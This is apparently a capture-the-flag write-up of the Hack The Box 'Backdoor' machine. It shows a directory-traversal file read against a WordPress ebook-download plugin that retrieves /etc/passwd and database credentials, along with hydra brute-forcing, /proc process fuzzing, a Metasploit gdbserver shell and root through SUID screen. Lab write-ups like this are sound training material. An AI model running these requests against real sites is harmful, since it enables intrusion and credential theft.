---
title: Backdoor Hackthebox
date: 18-12-2021 10:00
categories: [hackthebox,writeup] 
tags: [meterpreter,local file inclusion,screen,vulnerable plugins,screen]
---

# Backdoor

![Backdoor](/assets/img/backdoor/backdoor.png)

Backdoor is an easy machine from Hackthebox. We start from finding wordpress website then have a vulnerable plugins. The plugins is vulnerable to directory traversal and it allows local file inclusion. From this we can get the config file where it contents database credentials. Then with local file inclusion we can get a valid process that run gdbserver. Use metasploit to get reverse shell with meterpreter. From there we find a SUID binary where we can exploit and gain root.

---

## **Recon**

Nmap scan

```bash
PORT   STATE SERVICE REASON         VERSION
22/tcp open  ssh     syn-ack ttl 63 OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 b4:de:43:38:46:57:db:4c:21:3b:69:f3:db:3c:62:88 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDqz2EAb2SBSzEIxcu+9dzgUZzDJGdCFWjwuxjhwtpq3sGiUQ1jgwf7h5BE+AlYhSX0oqoOLPKA/QHLxvJ9sYz0ijBL7aEJU8tYHchYMCMu0e8a71p3UGirTjn2tBVe3RSCo/XRQOM/ztrBzlqlKHcqMpttqJHphVA0/1dP7uoLCJlAOOWnW0K311DXkxfOiKRc2izbgfgimMDR4T1C17/oh9355TBgGGg2F7AooUpdtsahsiFItCRkvVB1G7DQiGqRTWsFaKBkHPVMQFaLEm5DK9H7PRwE+UYCah/Wp95NkwWj3u3H93p4V2y0Y6kdjF/L+BRmB44XZXm2Vu7BN0ouuT1SP3zu8YUe3FHshFIml7Ac/8zL1twLpnQ9Hv8KXnNKPoHgrU+sh35cd0JbCqyPFG5yziL8smr7Q4z9/XeATKzL4bcjG87sGtZMtB8alQS7yFA6wmqyWqLFQ4rpi2S0CoslyQnighQSwNaWuBYXvOLi6AsgckJLS44L8LxU4J8=
|   256 aa:c9:fc:21:0f:3e:f4:ec:6b:35:70:26:22:53:ef:66 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBIuoNkiwwo7nM8ZE767bKSHJh+RbMsbItjTbVvKK4xKMfZFHzroaLEe9a2/P1D9h2M6khvPI74azqcqnI8SUJAk=
|   256 d2:8b:e4:ec:07:61:aa:ca:f8:ec:1c:f8:8c:c1:f6:e1 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIB7eoJSCw4DyNNaFftGoFcX4Ttpwf+RPo0ydNk7yfqca
80/tcp open  http    syn-ack ttl 63 Apache httpd 2.4.41 ((Ubuntu))
|_http-generator: WordPress 5.8.1
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: Backdoor &#8211; Real-Life
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

NSE: Script Post-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 22:48
Completed NSE at 22:48, 0.00s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 22:48
Completed NSE at 22:48, 0.00s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 22:48
Completed NSE at 22:48, 0.00s elapsed
Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 10.79 seconds
           Raw packets sent: 1004 (44.152KB) | Rcvd: 1001 (40.036KB)
```

Got port 22 and 80 in nmap scan. So we can proceed to enumerate http port. The web app is powered by wordpress.

![Wp-admin page](/assets/img/backdoor/Untitled.png)

                                                      Wp-admin page

The basic enumeration for http is we can brute force the directory with many tools in kali linux. Use the gobuster and got something that we can check.

```bash
root@Rav3nCLaW [10:26:04 AM] [~/Documents/htb/backdoor] 
-> # cat gobuster_80.out 
/index.php            (Status: 301) [Size: 0] [--> http://backdoor.htb/]
/wp-content           (Status: 301) [Size: 317] [--> http://backdoor.htb/wp-content/]
/wp-login.php         (Status: 200) [Size: 5674]
/license.txt          (Status: 200) [Size: 19915]
/wp-includes          (Status: 301) [Size: 318] [--> http://backdoor.htb/wp-includes/]
/readme.html          (Status: 200) [Size: 7346]
/wp-trackback.php     (Status: 200) [Size: 135]
/wp-admin             (Status: 301) [Size: 315] [--> http://backdoor.htb/wp-admin/]
/xmlrpc.php           (Status: 405) [Size: 42]
```

```bash
> # gobuster dir -u http://backdoor.htb/wp-content/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,txt,html,js
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://backdoor.htb/wp-content/
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Extensions:              php,txt,html,js
[+] Timeout:                 10s
===============================================================
2021/12/03 10:23:20 Starting gobuster in directory enumeration mode
===============================================================
/index.php            (Status: 200) [Size: 0]
/themes               (Status: 301) [Size: 324] [--> http://backdoor.htb/wp-content/themes/]
/uploads              (Status: 301) [Size: 325] [--> http://backdoor.htb/wp-content/uploads/]
/plugins              (Status: 301) [Size: 325] [--> http://backdoor.htb/wp-content/plugins/]
/upgrade              (Status: 301) [Size: 325] [--> http://backdoor.htb/wp-content/upgrade/]
```

From the results we can see new directory. Then check the page of `/plugins`  and found new things.

![Untitled](/assets/img/backdoor/Untitled%201.png)

ebook-download ?? so decided to google it and if i can find some exploit about the ebook.

Found the exploit that maybe works for the box.

![Untitled](/assets/img/backdoor/Untitled%202.png)

Just to confirm that the exploit can be use. Check the reaadme.txt and find the version of the ebook-download

![Untitled](/assets/img/backdoor/Untitled%203.png)

The stable tag is 1.1 and it is indeed that is the exploit that can be use.  After we apply the lfi in exploit db we can get the wp-config.php

![Untitled](/assets/img/backdoor/Untitled%204.png)

wp-config.php file is sensitive file for wordpress and it maybe contains some database credentials. Since wp-config.php is downloaded, the mysql credentials we can get it.

```bash
// ** MySQL settings - You can get this info from your web host ** //
/** The name of the database for WordPress */                                                                        
define( 'DB_NAME', 'wordpress' );                                                                                    
                                                                                                                     
/** MySQL database username */                                                                                       
define( 'DB_USER', 'wordpressuser' );
                                                          
/** MySQL database password */
define( 'DB_PASSWORD', 'MQYBJSaD#DxG6qbm' );
                                                          
/** MySQL hostname */
define( 'DB_HOST', 'localhost' );                                                                                    
                                                                                                                     
/** Database charset to use in creating database tables. */
define( 'DB_CHARSET', 'utf8' );

/** The database collate type. Don't change this if in doubt. */
define( 'DB_COLLATE', '' );
```

The credentials maybe for the db but worth a try to test it at the login page of [`wp-admin`](http://wp-admin.So)  So i intend to brute force the post form with hydra and get the result.

```bash
hydra -L /usr/share/wordlists/SecLists/Usernames/Names/names.txt -p "MQYBJSaD#DxG6qbm" backdoor.htb http-post-form "/wp-admin/:log=^USER^&pwd=^PASS^&wp-submit=Log+In&redirect_to=http%3A%2F%2Fbackdoor.htb%2Fwp-admin%2F&testcookie=1:S=302" -f 
Hydra v9.1 (c) 2020 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2021-12-03 10:54:59
[DATA] max 16 tasks per 1 server, overall 16 tasks, 10177 login tries (l:10177/p:1), ~637 tries per task
[DATA] attacking http-post-form://backdoor.htb:80/wp-admin/:log=^USER^&pwd=^PASS^&wp-submit=Log+In&redirect_to=http%3A%2F%2Fbackdoor.htb%2Fwp-admin%2F&testcookie=1:S=302
[80][http-post-form] host: backdoor.htb   login: abbas   password: MQYBJSaD#DxG6qbm
[STATUS] attack finished for backdoor.htb (valid pair found)
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2021-12-03 10:55:02
```

## **Foothold**

Unfortunately the credentials is not valid to the login page. Then run curl command to grab /etc/passwd and it works.

```bash
root@Rav3nCLaW [04:08:32 PM] [~/Documents/htb/backdoor] 
-> # curl http://backdoor.htb/wp-content/plugins/ebook-download/filedownload.php\?ebookdownloadurl\=/etc/passwd
/etc/passwd/etc/passwd/etc/passwdroot:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-network:x:100:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
systemd-timesync:x:102:104:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
messagebus:x:103:106::/nonexistent:/usr/sbin/nologin
syslog:x:104:110::/home/syslog:/usr/sbin/nologin
_apt:x:105:65534::/nonexistent:/usr/sbin/nologin
tss:x:106:111:TPM software stack,,,:/var/lib/tpm:/bin/false
uuidd:x:107:112::/run/uuidd:/usr/sbin/nologin
tcpdump:x:108:113::/nonexistent:/usr/sbin/nologin
landscape:x:109:115::/var/lib/landscape:/usr/sbin/nologin
pollinate:x:110:1::/var/cache/pollinate:/bin/false
usbmux:x:111:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologin
sshd:x:112:65534::/run/sshd:/usr/sbin/nologin
systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin
user:x:1000:1000:user:/home/user:/bin/bash
lxd:x:998:100::/var/snap/lxd/common/lxd:/bin/false
mysql:x:113:118:MySQL Server,,,:/nonexistent:/bin/false
<script>window.close()</script>#
```

Try take user id_rsa but cannot take it and start googling about LFI.Found something useful in LFI vulnerability.

![Untitled](/assets/img/backdoor/Untitled%205.png)

 From the above image, `/proc/[PID]/cmdline` is kinda interesting since we have users but not the passwords. Need to fuzz the PID

```bash
root@Rav3nCLaW [10:43:36 PM] [~/Documents/htb/backdoor] 
-> # wfuzz -c -w /usr/share/wordlists/SecLists/Fuzzing/3-digits-000-999.txt -u http://backdoor.htb/wp-content/plugins/ebook-download/filedownload.php\?ebookdownloadurl\=/proc/FUZZ/cmdline --hw 1
 /usr/lib/python3/dist-packages/wfuzz/__init__.py:34: UserWarning:Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz's documentation for more information.
********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************

Target: http://backdoor.htb/wp-content/plugins/ebook-download/filedownload.php?ebookdownloadurl=/proc/FUZZ/cmdline
Total requests: 1000

=====================================================================
ID           Response   Lines    Word       Chars       Payload                                                                                                                                                                   
=====================================================================

000000849:   200        0 L      12 W       183 Ch      "848"                                                                                                                                                                     
000000846:   200        0 L      11 W       181 Ch      "845"                                                                                                                                                                     
000000851:   200        0 L      5 W        148 Ch      "850"                                                                                                                                                                     
000000885:   200        0 L      3 W        128 Ch      "884"                                                                                                                                                                     
000000884:   200        0 L      8 W        138 Ch      "883"                                                                                                                                                                     
000000990:   200        0 L      5 W        145 Ch      "989"                                                                                                                                                                     

Total time: 4.972168
Processed Requests: 1000
Filtered Requests: 994
Requests/sec.: 201.1194
```

We find some PID and we can check all the PID thru the curl command that we use to output /etc/passwd. We got gdbserver configuration from the `/proc/845/cmdline`  

```bash
root@Rav3nCLaW [10:48:26 PM] [~/Documents/htb/backdoor] 
-> # curl http://backdoor.htb/wp-content/plugins/ebook-download/filedownload.php\?ebookdownloadurl\=/proc/845/cmdline -o procfile1.txt
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100   181  100   181    0     0   1601      0 --:--:-- --:--:-- --:--:--  1601
root@Rav3nCLaW [10:48:30 PM] [~/Documents/htb/backdoor] 
-> # cat procfile1.txt                                                                                                                
/proc/845/cmdline/proc/845/cmdline/proc/845/cmdline/bin/sh-cwhile true;do su user -c "cd /home/user;gdbserver --once 0.0.0.0:1337 /bin/true;"; done<script>window.close()</script>
```

Found the exploitdb and in metasploit. The exploitDB have the version of gdbserver but as for the metasploit it does not mention about the version so try the metasploit gdb exploit first.

![Metasploit gdbserver exploit](/assets/img/backdoor/Untitled%206.png)

Metasploit gdbserver exploit

![Meterpreter shell](/assets/img/backdoor/Untitled%207.png)

Meterpreter shell

Cannot ssh because user do not have the .ssh directory. In the meterpreter collect information about the system with find command.

## **Privelege Escalation**

```bash
user@Backdoor:~$ find / -perm -u=s -type f 2>/dev/null
find / -perm -u=s -type f 2>/dev/null
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/eject/dmcrypt-get-device
/usr/lib/policykit-1/polkit-agent-helper-1
/usr/lib/openssh/ssh-keysign
/usr/bin/passwd
/usr/bin/chfn
/usr/bin/gpasswd
/usr/bin/at
/usr/bin/su
/usr/bin/sudo
/usr/bin/newgrp
/usr/bin/fusermount
/usr/bin/screen
/usr/bin/umount
/usr/bin/mount
/usr/bin/chsh
/usr/bin/pkexec
```

With linpeas we can the screen version. 

![Untitled](/assets/img/backdoor/Untitled%208.png)

Since the screen file have SUID permission we can just attach to the root.

```bash
screen -x root/root
```

![Untitled](/assets/img/backdoor/Untitled%209.png)